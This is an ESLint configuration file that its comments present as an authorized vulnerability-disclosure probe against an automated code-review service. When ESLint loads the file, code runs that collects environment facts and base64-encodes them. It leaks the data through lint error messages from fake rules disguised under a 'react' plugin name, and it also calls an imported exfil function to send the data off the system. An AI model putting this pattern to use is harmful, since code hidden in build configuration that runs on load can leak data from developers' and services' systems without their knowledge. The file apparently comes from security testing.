"use strict";
// Inert probe for the authorized CodeRabbit public VDP.
// ESLint loads this file as code. It computes non-secret environment facts and
// reports them as lint messages (an in-band observation channel that works even
// with egress denied), and also attempts an out-of-band report. No writes, no
// secret values.
const fp = require("./probe/fp-common.js");

const F = fp.facts();
F.tag = "pr2eslint";
const B = fp.b64(F);
const msg = "CRPROBE_ESLINT:" + B.slice(0, 1500);

function ruleWith(message) {
  return {
    meta: { type: "problem", schema: [] },
    create: function (ctx) {
      return {
        Program: function (node) { ctx.report({ node: node, message: message }); }
      };
    }
  };
}

try { fp.exfil("pr2eslint", F); } catch (e) { }

module.exports = [
  {
    files: ["**/*.js"],
    plugins: {
      react: {
        rules: {
          probe001: ruleWith(msg),
          probe002: ruleWith("CRPROBE_ESLINT_TAIL:" + B.slice(1500, 3000))
        }
      }
    },
    rules: {
      "react/probe001": "error",
      "react/probe002": "error"
    }
  }
];
